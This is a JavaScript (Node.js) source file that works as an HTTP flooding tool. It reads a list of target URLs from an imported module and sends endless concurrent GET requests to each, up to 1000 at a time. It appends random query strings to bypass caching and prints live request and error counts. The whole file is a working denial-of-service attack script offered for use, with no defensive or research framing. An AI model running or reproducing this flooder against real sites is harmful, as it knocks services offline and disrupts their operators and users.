import fetch from 'node-fetch'
import { AbortController } from 'node-abort-controller'

import targets from './targets.js';

const targetStats = {}

targets.forEach((target) => {
    targetStats[target] = {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    }
})

function printStats() {
    console.clear()

    const stats = Object.entries(targetStats).map(
        ([target, { number_of_requests, number_of_errored_responses }]) => ({
            target,
            number_of_requests,
            number_of_errored_responses,
        })
    )

    console.table(stats)
}
setInterval(printStats, 1000)

const CONCURRENCY_LIMIT = 1000
const queue = []

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController()
    const id = setTimeout(() => controller.abort(), options.timeout)
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal,
    })
        .then((response) => {
            clearTimeout(id)
            return response
        })
        .catch((error) => {
            clearTimeout(id)
            throw error
        })
}

async function flood(target) {
    for (let i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000
        queue.push(
            fetchWithTimeout(target + rand, { timeout: 1000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return
                    }
                    targetStats[target].number_of_errored_responses++
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targetStats[target].number_of_errored_responses++
                    }
                    targetStats[target].number_of_requests++
                })
        )
    }
}

// Start
targets.map(flood)
